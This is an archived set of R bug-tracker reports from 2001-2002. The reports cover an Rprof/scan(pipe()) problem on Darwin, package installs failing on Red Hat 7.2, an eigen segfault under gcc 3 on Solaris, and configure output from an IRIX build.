> porter (Jan de Leeuw) needs to investigate.
> 
> 
> On Tue, 23 Oct 2001 macq@llnl.gov wrote:
> 
> > This looks like a bug?
> > Unable to use scan(pipe()) while profiling.
> > I have no idea whether this version of R violates the
> >     "do not use `Rprof' in an executable built for profiling"
> > warning in ?Rprof.
> >
> > Thanks
> > -Don
> >
> > >  version
> >           _
> > platform powerpc-apple-darwin1.4
> > arch     powerpc
> > os       darwin1.4
> > system   powerpc, darwin1.4
> > status   Patched
> > major    1
> > minor    3.1
> > year     2001
> > month    10
> > day      15
> > language R
> > >
> > >  foo <- scan(pipe('ls -1 | head -3'),what='')
> > Read 3 items
> > >  foo
> > [1] "README"      "RMfiles.dat" "RMfiles.tmp"
> > >  Rprof()
> > >  foo <- scan(pipe('ls -1 | head -3'),what='')
> > Read 0 items
> > >  foo
> > character(0)
> > >  Rprof(NULL)
> > >  foo <- scan(pipe('ls -1 | head -3'),what='')
> > Read 3 items
> > >
> >
> > note, profiling does appear to be functional:
> > >  Rprof() ; hist(rnorm(10000)) ; Rprof(NULL)
> > >  system('R CMD Rprof Rprof.out')
> >
> > Each sample represents 0.02 seconds.
> > Total run time: 0.1 seconds.
> >
> > Total seconds: time spent in function and callees.
> > Self seconds: time spent in function alone.
> >
> >     %       total       %       self
> >   total    seconds     self    seconds    name
> > 100.00      0.10      0.00      0.00     "hist"
> >   60.00      0.06      0.00      0.00     "hist.default"
> >   40.00      0.04     40.00      0.04     "rnorm"
> >   40.00      0.04      0.00      0.00     "plot"
> >   40.00      0.04      0.00      0.00     "plot.histogram"
> >   20.00      0.02      0.00      0.00     "storage.mode<-"
> >   20.00      0.02     20.00      0.02     "X11"
> >   20.00      0.02      0.00      0.00     "paste"
> >   20.00      0.02      0.00      0.00     "rect"
> >   20.00      0.02      0.00      0.00     "plot.new"
> >   20.00      0.02     20.00      0.02     "seq.default"
> >   20.00      0.02      0.00      0.00     "seq"
> >   20.00      0.02     20.00      0.02     "par"
> >
> >     %       self        %       total
> >   self     seconds    total    seconds    name
> >   40.00      0.04     40.00      0.04     "rnorm"
> >   20.00      0.02     20.00      0.02     "X11"
> >   20.00      0.02     20.00      0.02     "seq.default"
> >   20.00      0.02     20.00      0.02     "par"
> >
> > --
> > --------------------------------------
> > Don MacQueen
> > Environmental Protection Department
> > Lawrence Livermore National Laboratory
> > Livermore, CA, USA
> > --------------------------------------
> >
> > -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> > r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> > Send "info", "help", or "[un]subscribe"
> > (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> > _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
> >
> 
> -- 
> Brian D. Ripley,                  ripley@stats.ox.ac.uk
> Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
> University of Oxford,             Tel:  +44 1865 272861 (self)
> 1 South Parks Road,                     +44 1865 272860 (secr)
> Oxford OX1 3TG, UK                Fax:  +44 1865 272595
> 
> 
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._

-- 
Luke Tierney
University of Minnesota                      Phone:           612-625-7843
School of Statistics                         Fax:             612-624-8868
313 Ford Hall, 224 Church St. S.E.           email:      luke@stat.umn.edu
Minneapolis, MN 55455 USA                    WWW:  http://www.stat.umn.edu

==> 1140.followup.3 <==
From macq@llnl.gov  Mon Nov  5 18:47:53 2001
Received: from smtp-1.llnl.gov (smtp-1.llnl.gov [128.115.250.81])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA05624
	for <R-bugs@biostat.ku.dk>; Mon, 5 Nov 2001 18:47:52 +0100 (MET)
Received: from [128.115.153.6] (localhost [127.0.0.1])
	by smtp-1.llnl.gov (8.9.3/8.9.3/LLNL-gateway-1.0) with ESMTP id JAA05930;
	Mon, 5 Nov 2001 09:46:15 -0800 (PST)
Mime-Version: 1.0
X-Sender: e556558@popgun.llnl.gov
Message-Id: <p0510100bb80c7eff076c@[128.115.153.6]>
In-Reply-To: <Pine.LNX.4.31.0111041258370.19068-100000@gannet.stats>
References: <Pine.LNX.4.31.0111041258370.19068-100000@gannet.stats>
Date: Mon, 5 Nov 2001 09:46:10 -0800
To: Jan de Leeuw <deleeuw@stat.ucla.edu>
From: Don MacQueen <macq@llnl.gov>
Subject: Re: [Rd] Possible bug, Rprof() and scan(pipe()) (PR#1140)
Cc: Prof Brian Ripley <ripley@stats.ox.ac.uk>, <R-bugs@biostat.ku.dk>
Content-Type: text/plain; charset="us-ascii" ; format="flowed"

Jan,
Here is information on the problem with Rprof() that I encountered, 
including Brian Ripley's assessment.
This is OS X 10.1 with the 10.1 developer tools installed.
-Don

At 1:00 PM +0000 11/4/01, Prof Brian Ripley wrote:
>This does not happen on Solaris or Linux, so must be related to the use of
>signals on darwin.
>
>It probably means Rprof should be avoided on that platform, but the
>porter (Jan de Leeuw) needs to investigate.
>
>
>On Tue, 23 Oct 2001 macq@llnl.gov wrote:
>
>>  This looks like a bug?
>>  Unable to use scan(pipe()) while profiling.
>>  I have no idea whether this version of R violates the
>>      "do not use `Rprof' in an executable built for profiling"
>>  warning in ?Rprof.
>>
>>  Thanks
>>  -Don
>>
>>  >  version
>>            _
>>  platform powerpc-apple-darwin1.4
>>  arch     powerpc
>>  os       darwin1.4
>>  system   powerpc, darwin1.4
>>  status   Patched
>>  major    1
>>  minor    3.1
>>  year     2001
>>  month    10
>>  day      15
>>  language R
>>  >
>  > >  foo <- scan(pipe('ls -1 | head -3'),what='')
>>  Read 3 items
>>  >  foo
>>  [1] "README"      "RMfiles.dat" "RMfiles.tmp"
>>  >  Rprof()
>>  >  foo <- scan(pipe('ls -1 | head -3'),what='')
>>  Read 0 items
>>  >  foo
>>  character(0)
>>  >  Rprof(NULL)
>  > >  foo <- scan(pipe('ls -1 | head -3'),what='')
>>  Read 3 items
>>  >
>>
>>  note, profiling does appear to be functional:
>>  >  Rprof() ; hist(rnorm(10000)) ; Rprof(NULL)
>>  >  system('R CMD Rprof Rprof.out')
>  >
>>  Each sample represents 0.02 seconds.
>>  Total run time: 0.1 seconds.
>>
>>  Total seconds: time spent in function and callees.
>>  Self seconds: time spent in function alone.
>>
>>      %       total       %       self
>>    total    seconds     self    seconds    name
>>  100.00      0.10      0.00      0.00     "hist"
>>    60.00      0.06      0.00      0.00     "hist.default"
>>    40.00      0.04     40.00      0.04     "rnorm"
>>    40.00      0.04      0.00      0.00     "plot"
>>    40.00      0.04      0.00      0.00     "plot.histogram"
>>    20.00      0.02      0.00      0.00     "storage.mode<-"
>>    20.00      0.02     20.00      0.02     "X11"
>>    20.00      0.02      0.00      0.00     "paste"
>>    20.00      0.02      0.00      0.00     "rect"
>>    20.00      0.02      0.00      0.00     "plot.new"
>>    20.00      0.02     20.00      0.02     "seq.default"
>>    20.00      0.02      0.00      0.00     "seq"
>>    20.00      0.02     20.00      0.02     "par"
>>
>>      %       self        %       total
>>    self     seconds    total    seconds    name
>>    40.00      0.04     40.00      0.04     "rnorm"
>>    20.00      0.02     20.00      0.02     "X11"
>>    20.00      0.02     20.00      0.02     "seq.default"
>>    20.00      0.02     20.00      0.02     "par"
>>
>>  --
>>  --------------------------------------
>>  Don MacQueen
>>  Environmental Protection Department
>>  Lawrence Livermore National Laboratory
>>  Livermore, CA, USA
>>  --------------------------------------
>>
>> 
>>-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
>>  r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
>>  Send "info", "help", or "[un]subscribe"
>>  (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
>> 
>>_._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>>
>
>--
>Brian D. Ripley,                  ripley@stats.ox.ac.uk
>Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
>University of Oxford,             Tel:  +44 1865 272861 (self)
>1 South Parks Road,                     +44 1865 272860 (secr)
>Oxford OX1 3TG, UK                Fax:  +44 1865 272595


-- 
--------------------------------------
Don MacQueen
Environmental Protection Department
Lawrence Livermore National Laboratory
Livermore, CA, USA
--------------------------------------

==> 1140.audit <==
Sun Nov  4 13:54:41 2001	ripley	changed notes
Sun Nov  4 13:54:41 2001	ripley	foobar
Sun Nov  4 13:54:41 2001	ripley	moved from incoming to System-specific
Sun Apr 21 09:39:49 2002	ripley	changed notes
Sun Apr 21 09:39:49 2002	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1261 *
Subject: R_140 AND RHL_72 AND Packages
From: Patrick Gonin <gonin@genethon.fr>
Date: Wed, 15 Jan 2003 13:25:17 +0100
--Seems to relate to RH7.2 rpms
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1261 <==
From gonin@genethon.fr  Tue Jan 15 13:25:52 2002
Received: from sansgene.genethon.fr (root@sansgene.genethon.fr [193.50.68.15])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id NAA28694
	for <r-bugs@biostat.ku.dk>; Tue, 15 Jan 2002 13:25:51 +0100 (MET)
Received: from [192.168.100.154] (nat0-154.genethon.fr [192.168.100.154])
	by sansgene.genethon.fr (8.11.5/8.11.5) with ESMTP id g0FCPKT28309
	for <r-bugs@biostat.ku.dk>; Tue, 15 Jan 2002 13:25:20 +0100 (MET)
Mime-Version: 1.0
X-Sender: gonin@sansgene.genethon.fr
Message-Id: <a05100300ba4b0138cb3c@[192.168.100.154]>
Date: Wed, 15 Jan 2003 13:25:17 +0100
To: r-bugs@biostat.ku.dk
From: Patrick Gonin <gonin@genethon.fr>
Subject: R_140 AND RHL_72 AND Packages
Content-Type: text/plain; charset="us-ascii" ; format="flowed"

Dear colleagues,

>I use R under RH Linux 7.2 on a i686 PIII 733 machine.

I have a problem to install packages since R 1.4.0 has been installed.

>I have determined that whenever I install whichever package, the 
>installation (CMD INSTALL command) fail at finding R files, and at 
>finding all html,and other help files.
>However, it ends up with DONE INSTALL, and when you type 
>library(XXX) under R, there is no error. But it is like loading an 
>empty nutshell: no R function available, no help page available 
>(apart from the 00Index.html file).The only functional call is 
>always library(help=search) which displays all functions and 
>datasets of the package (the INDEX file, in fact). When looking at 
>the directories of the package, you find that only one file remains, 
>all other have disappeared (while they were there after tar).

I have also tried R CMD check which runs correctly and finds all files.

>The next test I did was desinstalling R 1.4.0, and reinstalling R 
>1.3.1, which led to no correction whatsoever (while before 
>installing R 1.4.0, there were no problem at all with R 1.3.1).
>Back with R 1.4.0, I am baffled, since it is like if the first 
>installation of R 1.4.0 had changed something to my Linux box.
>Last important element: some while ago, when I installed 15 packages 
>under RH 7.2 with R 1.3.1, everything worked OK. Moreover, for 
>upgrading to RH 7.2, I realised a new installation from scratch 
>after backup of all important data.

>Maybe I should also say that I install and desinstall R-base and 
>R-recommended using rpm files with gno-rpm.
Couldn't it be a general problem with the new binaries of R 1.4.0 and RH 7.2?
Any hint welcome, of course, because I have spend many many hours to 
try to fix that.

Best regards,
-- 
----------------------------
Patrick Gonin, DVM, PhD
Head of in vivo Evaluation Dept
GENETHON III
1 bis, rue de l'Internationale
BP 60
91002 EVRY CEDEX
FRANCE
Tel: 33-1-69-47-10-21
Fax: 33-1-60-77-86-98
gonin@genethon.fr
----------------------------

==> 1261.audit <==
Fri Jan 18 09:14:36 2002	ripley	changed notes
Fri Jan 18 09:14:36 2002	ripley	foobar
Fri Jan 18 09:14:36 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1272 *
Subject: eigen segfault with GCC 3 on Solaris
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
Date: Thu, 17 Jan 2002 15:14:33 -0500
--Seems to be a problem with g77 in gcc 3.0.2 on Solaris only.
--Probably a compiler bug
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1272 <==
From pgilbert@bank-banque-canada.ca  Thu Jan 17 21:26:12 2002
Received: from mail1.bank-banque-canada.ca (mail1.bank-banque-canada.ca [140.80.193.130])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA03042
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 21:26:11 +0100 (MET)
Received: from fwx-int (fwx-int.bank-banque-canada.ca [140.80.193.129])
	by mail1.bank-banque-canada.ca (8.9.3/8.9.3) with SMTP id PAA12351
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 15:14:51 -0500 (EST)
Received: from mfa99599.boc by mailhost.bank-banque-canada.ca (8.8.8+Sun/SMI-SVR4)
	id PAA12589; Thu, 17 Jan 2002 15:14:36 -0500 (EST)
Received: from mfa01506.boc (mfa01506 [140.80.3.112])
	by mfa99599.boc (8.9.1b+Sun/8.9.1) with ESMTP id PAA22347
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 15:14:35 -0500 (EST)
Received: from bank-banque-canada.ca (localhost [127.0.0.1])
	by mfa01506.boc (8.9.3+Sun/8.9.3) with ESMTP id PAA21692
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 15:14:33 -0500 (EST)
Sender: pgilbert@bank-banque-canada.ca
Message-ID: <3C4730A9.2F4818FA@bank-banque-canada.ca>
Date: Thu, 17 Jan 2002 15:14:33 -0500
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
X-Mailer: Mozilla 4.75 [en] (X11; U; SunOS 5.8 sun4u)
X-Accept-Language: en
MIME-Version: 1.0
To: R-bugs <R-bugs@biostat.ku.dk>
Subject: eigen segfault with GCC 3 on Solaris
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

A message this morning reminded me of a previous problem I had which should be
noted in R bugs, but is really a problem with gcc 3 I believe. It may be only a
problem on Solaris, but AFAIK has not been checked on other platforms. I
resolved it by going back to a gcc 2.9x.x (which a few people suggested). Below
is the relevant part of my original post, an example which provokes the
segfault, and some gdb information from Peter Dalgaard.

PG>I have now tested R 1.3.1 compiled with GCC 3.0.2 on Solaris and the example
I
PG>previously posted (repeated below) still gives a segmentation fault, as it
does
PG>with GCC 3.0.1 but not with 2.95.2. The eigen calculation sometimes needs to
be
PG> repeated several times before the segmentation fault occurs. La.eigen does
not
PG> cause a problem. (The problem occurred with R-devel too, but I have not
tested
PG> that with GCC 3.0.2.)

PD>I don't know if it helps, but I see it too... 3.0.1 on Solaris 2.7.
PD>
PD>gdb says that it is happening at l.2144 of eigen.f:
PD>
PD>2142    C
PD>2143                DO 760 J = M, EN
PD>2144                   RA = RA + H(I,J) * H(J,NA)
PD>2145                   SA = SA + H(I,J) * H(J,EN)
PD>2146      760       CONTINUE
PD>2147    C
PD>
PD>J prints as 7289784 for me, which looks a bit weird since M and EN are
PD>17 and 18 respectively. However, optimizers sometimes cause this sort
PD>of thing.

----- example -----


zz <- t(matrix(c(
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.082008166, -0.066322053,
-0.115616348,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.038919428,  0.009703382,
0.115944209,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -0.007823026, -0.068859673,
0.025264756,
1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.067027108,  0.087934957,
-0.316974768,
0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.024890008,  0.052195412,
-0.015138322,
0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.028192857, -0.004832597,
0.207879665,
0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.078706928, -0.012801413,
0.425960682,
0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0.102169750,  0.163238356,
-0.150373125,
0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, -0.002685166,  0.014355904,
0.197912183,
0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0,  0.042937314,  0.115719388,
0.679370293,
0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,  0.032306141,  0.263227910,
0.009171148,
0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,  0.008238734, -0.031480706,
0.051976566,
0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0,  0.015219148,  0.221345314,
0.020146770,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,  0.039741608,  0.092955553,
-0.262550823,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0,  0.012624418,  0.047810873,
0.201673308,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, -0.114163303,  0.417786916,
0.253110874,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0,  0.049894329, -0.155696562,
-0.049735728,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1,  0.006112607,  0.074242237,
0.034046467
), 18,18))

eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
eigen(zz)$values
Segmentation Fault - core dumped

==> 1272.audit <==
Fri Jan 18 09:10:34 2002	ripley	changed notes
Fri Jan 18 09:10:34 2002	ripley	foobar
Fri Jan 18 09:10:34 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1275 *
Subject: compile problem with bessel_i.c on IRIX64 flexor 6.5 10100655 IP35 (uname -a)
From: Walter Tautz <wtautz@math.uwaterloo.ca>
Date: Tue, 22 Jan 2002 10:05:20 -0500 (EST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1275 <==
From wtautz@math.uwaterloo.ca  Tue Jan 22 16:05:53 2002
Received: from mfcf.math.uwaterloo.ca (wtautz@mfcf.math.uwaterloo.ca [129.97.216.156])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA20264
	for <r-bugs@biostat.ku.dk>; Tue, 22 Jan 2002 16:05:52 +0100 (MET)
Received: from localhost (wtautz@localhost)
	by mfcf.math.uwaterloo.ca (8.9.3/8.9.3) with SMTP id KAA12752;
	Tue, 22 Jan 2002 10:05:20 -0500 (EST)
X-Authentication-Warning: mfcf.math: wtautz owned process doing -bs
Date: Tue, 22 Jan 2002 10:05:20 -0500 (EST)
From: Walter Tautz <wtautz@math.uwaterloo.ca>
Reply-To: Walter Tautz <wtautz@math.uwaterloo.ca>
To: r-bugs@biostat.ku.dk
cc: Walter Tautz <wtautz@math.uwaterloo.ca>
Subject: compile problem with bessel_i.c on IRIX64 flexor 6.5 10100655 IP35 (uname -a)
Message-ID: <Pine.SOL.3.96.1020122095845.3015H-100000@mfcf.math.uwaterloo.ca>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

I have included the full configure/make output:
(the particular error regarding bessel_i.c is at
the END of the report). 


-walter tautz 




	cd build/R-1.4.0 \
	    && unset noclobber \
	&& CPPFLAGS=" " \
	    LDFLAGS="" \
	       ./configure --prefix=/software/r-1 \
	           --datadir=/software/r-1/data \
	           --libdir=/software/r-1/lib \
	           --includedir=/software/r-1/include \
		   --with-x \
			   \
			 \
	           | tee configure.XHIER.log 2>&1 \
	&& touch XHIER_CONFIGURED
creating cache ./config.cache
checking for a BSD compatible install... tools/install-sh -c
checking whether build environment is sane... yes
checking whether make sets ${MAKE}... yes
checking for working aclocal... found
checking for working autoconf... found
checking for working automake... found
checking for working autoheader... found
checking for working makeinfo... found
checking host system type... mips-sgi-irix6.5
loading site script ./config.site
loading build specific script ./config.site
checking for pwd... /sbin/pwd
checking whether builddir is srcdir... yes
checking for gcc... gcc
checking whether the C compiler (gcc  ) works... yes
checking whether the C compiler (gcc  ) is a cross-compiler... no
checking whether we are using GNU C... yes
checking whether gcc accepts -g... yes
checking how to run the C preprocessor... gcc -E
checking whether gcc needs -traditional... no
checking whether gcc accepts -M for generating dependencies... yes
checking whether gcc supports -c -o FILE.lo... yes
checking for mawk... no
checking for gawk... no
checking for nawk... nawk
checking whether ln -s works... yes
checking for ranlib... :
checking for bison... bison -y
checking for ar... ar
checking whether echo can suppress newlines... yes
configure: warning: redefining INSTALL to be /scratch/usr/source/r-1/build/R-1.4.0/tools/install-sh -c
checking for javac... no
checking for less... /.software/local/.admin/bins/bin/less
checking for perl... /.software/local/.admin/bins/bin/perl
checking whether perl version is at least 5.004... yes
checking for dvips... no
checking for tex... configure: warning: you cannot build DVI versions of the R manuals
configure: warning: you cannot build PDF versions of the R manuals
no
checking for latex... no
checking for makeindex... no
checking for pdftex... no
checking for pdflatex... no
checking for makeinfo... /.software/local/.admin/bins/bin/makeinfo
checking for unzip... no
checking for zip... no
checking for Cygwin environment... no
checking for mingw32 environment... no
checking build system type... mips-sgi-irix6.5
checking for ld used by GCC... /usr/bin/ld
checking if the linker (/usr/bin/ld) is GNU ld... no
checking for /usr/bin/ld option to reload object files... -r
checking for BSD-compatible nm... /usr/bin/nm -B
checking how to recognise dependant libraries... pass_all
checking for object suffix... o
checking for executable suffix... no
checking command to parse /usr/bin/nm -B output... ok
checking for dlfcn.h... yes
checking for ranlib... (cached) :
checking for strip... strip
checking for objdir... .libs
checking for gcc option to produce PIC... none
checking if gcc static flag -static works... no
checking if gcc supports -c -o file.o... yes
checking if gcc supports -c -o file.lo... 
checking if gcc supports -fno-rtti -fno-exceptions... yes
checking whether the linker (/usr/bin/ld -64) supports shared libraries... yes
checking how to hardcode library paths into programs... immediate
checking whether stripping libraries is possible... no
checking dynamic linker characteristics... irix6.5 ld.so
checking if libtool supports shared libraries... yes
checking whether -lc should be explicitly linked in... yes
creating libtool
checking whether makeinfo version is at least 4... yes
checking for main in -lm... yes
defining F77 to be g77
checking whether the Fortran 77 compiler (g77  ) works... yes
checking whether the Fortran 77 compiler (g77  ) is a cross-compiler... no
checking whether we are using GNU Fortran 77... yes
checking whether g77 accepts -g... yes
checking for Fortran 77 libraries...  -lg2c -lm -L/.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/mabi=64 -L/.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3 -L/usr/bin -L/.software/arch/gcc-2.95.3/dis

tribution/lib/mabi=64 -L/.software/arch/gcc-2.95.3/distribution/lib -lm -L/usr/lib64/mips3 -L/usr/lib64
checking whether g77 appends underscores... yes
checking whether g77 and gcc agree on int and double... yes
checking whether g77 and gcc agree on double complex... yes
checking whether g77 supports -c -o FILE.lo... yes
checking for c++... g++
checking whether the C++ compiler (g++  ) works... yes
checking whether the C++ compiler (g++  ) is a cross-compiler... no
checking whether we are using GNU C++... yes
checking whether g++ accepts -g... yes
checking how to run the C++ preprocessor... g++ -E
checking whether g++ accepts -M for generating dependencies... yes
checking whether g++ supports -c -o FILE.lo... yes
checking for sin in -lm... yes
checking for sin in -lmoto... no
checking for main in -lncurses... no
checking for main in -ltermcap... yes
checking for dlopen in -ldl... no
checking for ATL_xerbla in -latlas... no
checking for zherk in -lblas... no
checking for dgemm_ in -lblas... yes
checking for rl_callback_read_char in -lreadline... no
checking for working alloca.h... yes
checking for alloca... yes
checking for ANSI C header files... yes
checking for pid_t... yes
checking for vfork.h... no
checking for working vfork... no
checking for vprintf... yes
checking for access... yes
checking for acosh... yes
checking for asinh... yes
checking for atanh... yes
checking for bcopy... yes
checking for bzero... yes
checking for finite... yes
checking for ftruncate... yes
checking for getcwd... yes
checking for getgrgid... yes
checking for getpwuid... yes
checking for getuid... yes
checking for hypot... yes
checking for isascii... yes
checking for isnan... yes
checking for matherr... no
checking for memcpy... yes
checking for memmove... yes
checking for mempcpy... no
checking for mkfifo... yes
checking for popen... yes
checking for putenv... yes
checking for rint... yes
checking for setenv... no
checking for snprintf... yes
checking for strcoll... yes
checking for stat... yes
checking for strptime... yes
checking for system... yes
checking for times... yes
checking for unsetenv... no
checking for vsnprintf... yes
checking for strdup... yes
checking for library containing connect... none required
checking for library containing gethostbyname... none required
checking for library containing xdr_string... none required
checking for __setfpucw... no
checking for working calloc... yes
checking for working finite... yes
checking for working log... yes
checking for working strptime... no
checking for ANSI C header files... (cached) yes
checking whether time.h and sys/time.h may both be included... yes
checking for dirent.h that defines DIR... yes
checking for opendir in -ldir... no
checking for sys/wait.h that is POSIX.1 compatible... yes
checking for arpa/inet.h... yes
checking for dl.h... no
checking for dlfcn.h... (cached) yes
checking for elf.h... yes
checking for errno.h... yes
checking for fcntl.h... yes
checking for floatingpoint.h... no
checking for fpu_control.h... no
checking for grp.h... yes
checking for ieee754.h... no
checking for ieeefp.h... yes
checking for locale.h... yes
checking for netdb.h... yes
checking for netinet/in.h... yes
checking for pwd.h... yes
checking for readline/history.h... yes
checking for readline/readline.h... yes
checking for rpc/xdr.h... yes
checking for string.h... yes
checking for strings.h... yes
checking for sys/param.h... yes
checking for sys/select.h... yes
checking for sys/socket.h... yes
checking for sys/stat.h... yes
checking for sys/time.h... yes
checking for sys/times.h... yes
checking for sys/utsname.h... yes
checking for unistd.h... yes
checking whether setjmp.h is POSIX.1 compatible... yes
checking for GNU C library with version >= 2... no
checking whether math.h defines isfinite... no
checking whether math.h defines isnan... no
checking return type of signal handlers... void
checking for pid_t... (cached) yes
checking for size_t... yes
checking for blkcnt_t... yes
checking for sys/socket.h... (cached) yes
checking for type of socket length... size_t *
checking whether byte ordering is bigendian... yes
checking for working const... yes
checking size of int... 4
checking size of long... 8
checking size of long long... 8
checking size of long double... 8
checking whether C compiler needs -OPT:IEEE_NaN_inf=ON... no
checking for xmkmf... /usr/bin/X11/xmkmf
checking for X... libraries , headers 
checking for dnet_ntoa in -ldnet... no
checking for dnet_ntoa in -ldnet_stub... no
checking for gethostbyname... yes
checking for connect... yes
checking for remove... yes
checking for shmat... yes
checking for IceConnectionNumber in -lICE... yes
checking for tclConfig.sh... no
checking for tkConfig.sh... no
checking for tcl.h... no
checking for finite... (cached) yes
checking for isnan... (cached) yes
checking whether you have IEEE 754 floating-point arithmetic... yes
checking for BSD networking... yes
checking for jpeglib.h... yes
checking if jpeglib version >= 6b... no
checking for main in -lz... yes
checking for png.h... yes
checking if libpng version >= 1.0.5... no
checking for XDR support... yes
checking for gzopen in -lz... yes
checking for zlib.h... yes
checking if zlib version >= 1.1.3... no
checking whether leap seconds are treated according to POSIX... yes
checking for setitimer... yes
checking for lpr... lpr
checking for paperconf... false
updating cache ./config.cache
creating ./config.status
creating Makeconf
creating Makefile
creating afm/Makefile
creating doc/Makefile
creating doc/html/Makefile
creating doc/html/search/Makefile
creating doc/manual/Makefile
creating etc/Makefile
creating etc/Makeconf
creating etc/Renviron
creating m4/Makefile
creating share/Makefile
creating src/Makefile
creating src/appl/Makefile
creating src/include/Makefile
creating src/include/R_ext/Makefile
creating src/library/Makefile
creating src/library/base/DESCRIPTION
creating src/library/base/Makefile
creating src/library/profile/Makefile
creating src/library/ctest/DESCRIPTION
creating src/library/ctest/Makefile
creating src/library/ctest/src/Makefile
creating src/library/eda/DESCRIPTION
creating src/library/eda/Makefile
creating src/library/eda/src/Makefile
creating src/library/lqs/DESCRIPTION
creating src/library/lqs/Makefile
creating src/library/lqs/src/Makefile
creating src/library/methods/DESCRIPTION
creating src/library/methods/Makefile
creating src/library/methods/src/Makefile
creating src/library/modreg/DESCRIPTION
creating src/library/modreg/Makefile
creating src/library/modreg/src/Makefile
creating src/library/mva/DESCRIPTION
creating src/library/mva/Makefile
creating src/library/mva/src/Makefile
creating src/library/nls/DESCRIPTION
creating src/library/nls/Makefile
creating src/library/nls/src/Makefile
creating src/library/stepfun/DESCRIPTION
creating src/library/stepfun/Makefile
creating src/library/splines/DESCRIPTION
creating src/library/splines/Makefile
creating src/library/splines/src/Makefile
creating src/library/tcltk/DESCRIPTION
creating src/library/tcltk/Makefile
creating src/library/tcltk/src/Makefile
creating src/library/tools/DESCRIPTION
creating src/library/tools/Makefile
creating src/library/ts/DESCRIPTION
creating src/library/ts/Makefile
creating src/library/ts/src/Makefile
creating src/main/Makefile
creating src/modules/Makefile
creating src/modules/X11/Makefile
creating src/modules/gnome/Makefile
creating src/modules/internet/Makefile
creating src/modules/lapack/Makefile
creating src/modules/vfonts/Makefile
creating src/nmath/Makefile
creating src/nmath/standalone/Makefile
creating src/scripts/Makefile
creating src/scripts/COMPILE
creating src/scripts/INSTALL
creating src/scripts/REMOVE
creating src/scripts/R.sh
creating src/scripts/Rdconv
creating src/scripts/Rdindex
creating src/scripts/Rprof
creating src/scripts/SHLIB
creating src/scripts/Sd2Rd
creating src/scripts/build
creating src/scripts/check
creating src/unix/Makefile
creating tests/Makefile
creating tests/Embedding/Makefile
creating tests/Examples/Makefile
creating tools/Makefile
